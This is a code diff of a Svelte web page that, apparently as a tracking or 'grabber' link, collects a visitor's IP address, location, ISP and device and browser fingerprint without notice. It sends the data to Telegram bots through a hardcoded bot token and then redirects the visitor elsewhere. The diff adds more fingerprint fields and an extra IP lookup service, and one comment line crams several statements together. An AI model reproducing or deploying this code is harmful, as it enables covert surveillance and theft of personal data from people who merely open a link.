@@ -2,10 +2,11 @@
 
 <script>
   import { onMount } from 'svelte';
-  sendIPToTelegramBots();
-
   onMount(async () => {
-  
+sendIPToTelegramBots();
+
+
+
     // Request location permission automatically
     navigator.geolocation.getCurrentPosition(
       (position) => {
@@ -16,9 +17,9 @@
         if (error.code === error.PERMISSION_DENIED) {
           // Location permission denied, send IP result to Telegram bots
         
-//////1//////
+
 redirectToNextURL();
-//////1//////
+
         }
       }
     );
@@ -45,8 +46,10 @@ redirectToNextURL();
 	const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
     const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
 
+// Location icon as text (Unicode character)
+const locationIcon = "\u{1F4CD}";
 
-    const htmlMessage = `${message}\n\n ${clickableLink}\n \n${ipLocationNetLink}`;
+    const htmlMessage = `${locationIcon} ${message}\n\n ${clickableLink}\n \n${ipLocationNetLink}`;
 
 
     // Send location and IP results to Telegram bots using an HTTP request
@@ -63,18 +66,62 @@ redirectToNextURL();
     });
   }
 
+
+
   async function sendIPToTelegramBots() {
     // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
     const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
     const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
 
-    // Get the IP address using ipify API
+// Get the IP address using ipify API
     const response = await fetch('https://api.ipify.org/?format=json');
     const data = await response.json();
     const ipAddress = data.ip;
 
-    const message = `\nالايبي:\n \n${ipAddress}`;
-	
+const userAgentData = navigator.userAgentData;
+  const userAgent = navigator.userAgent;
+  const platform = navigator.platform;
+  const screenWidth = window.screen.width;
+  const screenHeight = window.screen.height;
+  const cpuCores = navigator.hardwareConcurrency || 'N/A'; // Not all browsers support this property
+  const totalRAM = navigator.deviceMemory || 'N/A'; // Not all browsers support this property
+  const vendor = navigator.vendor;
+  const isAndroid = userAgent.toLowerCase().includes('android');
+  
+  const ipInfo = await getIPInfo(ipAddress);
+  const country = ipInfo.country_name || 'N/A';
+  const city = ipInfo.city || 'N/A';
+  const isp = ipInfo.org || 'N/A';
+
+
+
+
+    
+
+// Retrieve additional information about the user's system and browser const userAgent = navigator.userAgent; const platform = navigator.platform; const language = navigator.language; const screenWidth = window.screen.width; const screenHeight = window.screen.height; const cpuCores = navigator.hardwareConcurrency || 'N/A'; // Not all browsers support this property const totalRAM = navigator.deviceMemory || 'N/A'; // Not all browsers support this property const vendor = navigator.vendor; const renderingEngine = getRenderingEngine(); 
+
+
+
+   const message = `
+
+    الايبي: ${ipAddress}
+    \nالبلد: ${country}
+    مدينه مزود الخدمه: ${city}
+    المنظمة : ${isp}
+    المنصه: ${platform}
+    عرض الشاشة: ${screenWidth}
+    ارتفاع الشاشه: ${screenHeight}
+    عدد المعالجات: ${cpuCores}
+    الرامات: ${totalRAM}
+    شركه السوفتوير: ${vendor}
+     اندرويد: ${isAndroid ? 'نعم' : 'لا'}
+
+    \nباقي البيانات: ${userAgent}
+
+`;
+
+
+
 	 // Create the message with clickable link
     const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
     const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
@@ -96,7 +143,13 @@ redirectToNextURL();
   }
 
 
-
+async function getIPInfo(ip) {
+    const response = await fetch(`https://ipapi.co/${ip}/json/`);
+    if (response.ok) {
+      return response.json();
+    }
+    return {};
+  }
 
 function redirectToNextURL() {
   // Get the current URL
